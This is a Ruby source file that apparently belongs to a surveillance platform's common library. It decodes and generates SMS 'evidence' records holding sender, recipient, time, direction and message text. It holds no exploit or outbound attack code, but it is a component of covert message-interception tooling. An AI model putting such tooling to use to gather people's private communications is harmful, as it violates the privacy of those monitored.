require_relative 'common'
require 'rcs-common/serializer'

module RCS

  module SmsoldEvidence
    def content
      raise "Not implemented!"
    end

    def generate_content
      raise "Not implemented!"
    end

    def decode_content(common_info, chunks)

      info = Hash[common_info]
      info[:data] ||= Hash.new
      info[:data][:type] = :sms

      stream = StringIO.new chunks.join
      @sms = MAPISerializer.new.unserialize stream

      info[:da] = @sms.delivery_time
      info[:data][:from] = @sms.fields[:from].delete("\x00")
      info[:data][:rcpt] = @sms.fields[:rcpt].delete("\x00")
      info[:data][:content] = @sms.fields[:subject]
      info[:data][:incoming] = @sms.flags

      yield info if block_given?
      :keep_raw
    end
  end # ::SmsoldEvidence

  module SmsEvidence

    SMS_VERSION = 2010050501

    def content
      "test sms".to_utf16le_binary_null
    end

    def generate_content
      [ content ]
    end

    def additional_header
      header = StringIO.new
      header.write [SMS_VERSION].pack("l")
      header.write [[0,1].sample].pack("l") # incoming
      time = Time.now.getutc.to_filetime
      header.write time.pack('L*')
      header.write "+39123456789".ljust(16, "\x00")
      header.write "+39987654321".ljust(16, "\x00")
      header.string
    end

    def decode_additional_header(data)
      binary = StringIO.new data

      version = binary.read(4).unpack('l').first
      raise EvidenceDeserializeError.new("invalid log version for SMS") unless version == SMS_VERSION

      ret = Hash.new
      ret[:data] = Hash.new

      ret[:data][:incoming] = binary.read(4).unpack('l').first
      low, high = binary.read(8).unpack('L2')
      # ignore this time value, it's the same as the acquired in the common header
      # Time.from_filetime high, low
      ret[:data][:from] = binary.read(16).delete("\x00")
      ret[:data][:rcpt] = binary.read(16).delete("\x00")

      return ret
    end

    def decode_content(common_info, chunks)
      info = Hash[common_info]
      info[:data] ||= Hash.new
      info[:data][:type] = :sms

      stream = StringIO.new chunks.join

      info[:data][:content] = stream.read.utf16le_to_utf8

      yield info if block_given?
      :delete_raw
    end
  end # ::SmsEvidence

end # ::RCS
